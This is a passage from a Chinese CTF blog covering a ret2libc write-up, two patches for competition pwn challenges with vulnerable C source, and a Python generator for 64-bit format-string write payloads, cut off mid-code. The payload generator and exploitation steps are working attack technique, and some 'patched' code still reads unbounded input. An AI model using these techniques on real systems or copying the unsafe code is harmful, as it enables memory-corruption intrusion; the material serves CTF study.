<p>直接把payload 进行一次加密就完了，然后进行正常的ROP就完了，pop_rdi, 将__libc_start_got pop到rdi里，然后puts就是puts got，然后返回地址就是0x0000000000400B28<br>泄露过后，我这里进行调试了很多遍，才知道如何接受那个字符串，就是泄露的libc_start_main地址</p>
<p>接受成功后，就是在pop bin_sh 然后执行system函数就完了，</p>
<p>现在写writeup的时候，发觉有更简单的办法，加密函数根本不用管，我原来错的只是寄存器传参的问题，因为我发觉我后面传payload的时候忘了加密也成了。。。。<br>所以。。。原来是简单题，被我做复杂了。。。<br>只是一个在简单不过的ret2libc??</p>
<p>还有个内网我无法下载libc。。。幸亏我特么本机存了ctf-wiki的libc，那个题目的libc直接打成了是libc2.23.so<br>好像后面的题目也给了libc，直接下载也成吧<br>以后要正确区分64位程序跟32位程序区别，这次踩了好久的坑</p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛pwn修复1</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<p>#修复部分</p><p>题目出现的麻烦就是出现了gets危险函数，所以把gets危险函数去除，换成fgets或换成c++的cin即可，甚至可以加个cannary保护，因为题目本身没泄露，所以没法泄露cannary，所以溢出都不行了，cannary保护我也不记得命令，玩蛇皮，不给百度</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"===================================================================="</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"1.Encrypt"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"2.Decrypt"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"3.Exit"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Input your choice!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">48</span>];</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input your Plaintext to be encrypted"</span>);</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">    <span class="keyword">while</span>( <span class="built_in">strlen</span>(s) &gt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span>)</span><br><span class="line">                    s[x] ^= <span class="number">0xf</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                s[x] ^= <span class="number">14</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            s[x] ^= <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++x;</span><br><span class="line">    &#125;</span><br><span class="line">    s[<span class="number">47</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Ciphertext"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> input;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEEEE                            hh      iii                "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"===================================================================="</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to this Encryption machine\n"</span>);</span><br><span class="line">    begin();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            fflush(<span class="number">0</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="keyword">if</span>(input != <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"I think you can do it by yourself"</span>);</span><br><span class="line">            begin();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(input == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( input != <span class="number">1</span>  )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        encrypt();</span><br><span class="line">        begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something Wrong!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>


<p>手写了一遍代码，将gets危险函数替换掉了，其余没什么问题，这个比赛真心好，不让百度。。。。我很多函数都不会，没法查。。后面只能放弃。。</p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛pwn修复2</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="题目修复部分"><a href="#题目修复部分" class="headerlink" title="题目修复部分"></a>题目修复部分</h1><p>题目的点很容易看出，数组越界，不过如何利用这个比较难，我经过一段时间测试，发觉scanf的特性，输入-可以绕过，所以可以泄露cannary，泄露cannary过后可以任意写，然后精确覆盖到cannary过后进行ROP就行了，还有一个点就是输入长度为27的时候，他不会进行排序，这样才能ROP，不过最终我没利用成功，还有一个栈的偏移点我还没搞懂，所以最终也没打出来</p><a id="more"></a>
<p>修复建议:在读和写的时候都限制数组长度，还有排序的时候考虑长度为27的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">const</span> <span class="keyword">void</span> *a2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(*(<span class="keyword">int</span> *)a1 - *(<span class="keyword">int</span> *)a2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> v2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"do you would to sort your girlfriends?[Y/N/@]"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">78</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">89</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">64</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer two questions!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1+1999=??\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer the question1:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1*1999=??\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please answer the question2:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">94</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are right~\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my girlfriend,today is very interesting!!! "</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nice to meet you!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"here is a pole! \n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input your name:"</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hello my destiny!\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> k; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> base[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    v7 = <span class="number">999</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"how many girlfriends do you have?"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"please input your %dth girlfriends:"</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">999</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is the sort result:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v2; ++j )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d  "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)base[j]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you can change your girlfriend"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    v8 = v2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"which girlfriend do you want to change?"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v2; ++k )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"now change:"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[k]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">79</span> &amp;&amp; v2 &gt; <span class="number">39</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> &amp;&amp; v2 &gt; <span class="number">80</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">64</span> &amp;&amp; v2 &gt; <span class="number">55</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt;= <span class="number">27</span> || v2 &gt; <span class="number">39</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( v2 &lt;= <span class="number">26</span> )</span><br><span class="line"></span><br><span class="line">                qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">                qsort(base,v2,<span class="number">4u</span>LL,cmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sub();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//sub2();</span></span><br><span class="line"></span><br><span class="line">    sub1();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>64位格式化字符串自动篇</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="64位格式化字符串之自动化脚本编写"><a href="#64位格式化字符串之自动化脚本编写" class="headerlink" title="64位格式化字符串之自动化脚本编写"></a>64位格式化字符串之自动化脚本编写</h1><p>前言：pwntools的工具只支持32位格式化字符串，我每次做64位格式化字符串的题目都是手动调试了很久，做一道题调试得花个大半部分时间，然后再编写exp，所以我近几天在研究如何自动化的生成payload，让我能够轻松不调试一波梭，在了解原理过后，我便开始了我的编写之路。</p><a id="more"></a>
<h2 id="fmt-payload之写入篇"><a href="#fmt-payload之写入篇" class="headerlink" title="fmt_payload之写入篇"></a>fmt_payload之写入篇</h2><p>先补充个知识：</p>
<ul>
<li>%hhn写入的是一个字节</li>
<li>%hn写入的是两个字节</li>
<li>%n写入的是四个字节<h3 id="栈偏移位置的确定"><a href="#栈偏移位置的确定" class="headerlink" title="栈偏移位置的确定"></a>栈偏移位置的确定</h3></li>
<li>以前都是手动调试的，然后调试多次过后发觉了规律：</li>
<li>他的位置就是开头6个寄存器加上你输入的payload长度/8，</li>
<li>因为64位程序以8个字节为一个单位，也就是说，你输入了40个字节的字符串，偏移位置就是11</li>
</ul>
<h3 id="大小的选择"><a href="#大小的选择" class="headerlink" title="大小的选择"></a>大小的选择</h3><ul>
<li>因为他是按已输出字符来写入的，如果你大的放前面，小的在后面就没法写入了，所以需要进行排序</li>
</ul>
<p>了解这两个过程后，我们便可以开始进行脚本的编写了</p>
<h3 id="脚本的编写"><a href="#脚本的编写" class="headerlink" title="脚本的编写"></a>脚本的编写</h3><h4 id="获得你需要写入的内容"><a href="#获得你需要写入的内容" class="headerlink" title="获得你需要写入的内容"></a>获得你需要写入的内容</h4><p>我是按一个字节一个字节写入的，所以我需要获得每个字节的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAddr</span><span class="params">(write)</span>:</span></span><br><span class="line">    xor = <span class="number">0xff</span></span><br><span class="line">    addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        result = (xor &amp; write) &gt;&gt; (i * <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">            addr.append(result)</span><br><span class="line">        xor = xor * <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure>
<p>解释下，在每个字节的对应位置 &amp; 0xff便可以获得那个位置的内容</p>
<h4 id="划分部分"><a href="#划分部分" class="headerlink" title="划分部分"></a>划分部分</h4><p>因为我需要将被写入的地址以及他们的内容对应起来，并进行排序，小的优先写，然后大的放后面，所以就要进行划分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Partion</span><span class="params">(write, bewrite)</span>:</span></span><br><span class="line">    addr = getAddr(write)</span><br><span class="line">    part = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">        part.append( (addr[i], p64(bewrite+i)) )</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>]) <span class="comment">#进行排序，按内容大小来排</span></span><br><span class="line">    <span class="keyword">return</span> part</span><br></pre></td></tr></table></figure>
<h4 id="获取排序后的数组"><a href="#获取排序后的数组" class="headerlink" title="获取排序后的数组"></a>获取排序后的数组</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sizeUp</span><span class="params">(part)</span>:</span></span><br><span class="line">    size = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(part)):</span><br><span class="line">        size.append(part[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> size</span><br></pre></td></tr></table></figure>

<h4 id="将地址进行打包"><a href="#将地址进行打包" class="headerlink" title="将地址进行打包"></a>将地址进行打包</h4><p>因为我是将地址放在后面的，防止00截断，然后在将排序后的地址按顺序打包起来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packAddr</span><span class="params">(part)</span>:</span></span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    address = <span class="string">''</span>.join(addr)</span><br><span class="line">    <span class="keyword">return</span> address</span><br></pre></td></tr></table></figure>

<h4 id="处理偏移"><a href="#处理偏移" class="headerlink" title="处理偏移"></a>处理偏移</h4><p>自动进行计算偏移，原因我已经说过了，通过计算是可以得出偏移位置的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offsetDeal</span><span class="params">(size)</span>:</span></span><br><span class="line">    length = <span class="number">12</span> * len(size)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        offset = length / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset = length / <span class="number">8</span></span><br><span class="line">    length = offset * <span class="number">8</span> </span><br><span class="line">    offset += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> offset, length</span><br></pre></td></tr></table></figure>

<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><p>只是将对应位置和对应偏移的payload搞定</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payloadGenerate</span><span class="params">(size, offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[<span class="number">0</span>], offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(size)):</span><br><span class="line">        payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[i]-size[i<span class="number">-1</span>],offset+i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<h4 id="主要函数，生成完整payload"><a href="#主要函数，生成完整payload" class="headerlink" title="主要函数，生成完整payload"></a>主要函数，生成完整payload</h4><ol>
<li>首先获得划分并排序后的数组，就是地址和写入内容对应的数组</li>
<li>获得对应的大小，方便后面格式化</li>
<li>获得打包后的地址，方便后面添加</li>
<li>然后处理偏移和地址的对齐，64位按8个字节这样对齐</li>
<li>生成payload并进行对齐</li>
<li>offset可选，防止意外，自行找offset</li>
<li>返回payload<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_payload</span><span class="params">(bewrite,  write, offset=<span class="number">0</span> )</span>:</span></span><br><span class="line">    part = Partion(write, bewrite)</span><br><span class="line">    size = sizeUp(part)</span><br><span class="line">    address = packAddr(part)</span><br><span class="line"></span><br><span class="line">    result = offsetDeal(size)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        offset = result[<span class="number">0</span>]</span><br><span class="line">    length = result[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    payload = payloadGenerate(size, offset)</span><br><span class="line">    payload = payload.ljust(length, <span class="string">'a'</span>)</span><br><span class="line">    payload += address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
example: <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmt_payload(exit_got,<span class="number">0x0000000000400626</span>)</span><br><span class="line">payload = fmt_payload(exit_got,<span class="number">0x0000000000400626</span>，<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得写入的每一位的内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAddr</span><span class="params">(write)</span>:</span></span><br><span class="line">    xor = <span class="number">0xff</span></span><br><span class="line">    addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        result = (xor &amp; write) &gt;&gt; (i * <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">            addr.append(result)</span><br><span class="line">        xor = xor * <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分部分，按大小排序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Partion</span><span class="params">(write, bewrite)</span>:</span></span><br><span class="line">    addr = getAddr(write)</span><br><span class="line">    part = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">        part.append( (addr[i], p64(bewrite+i)) )</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> part</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得排序后的大小，升序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sizeUp</span><span class="params">(part)</span>:</span></span><br><span class="line">    size = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(part)):</span><br><span class="line">        size.append(part[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> size</span><br><span class="line"></span><br><span 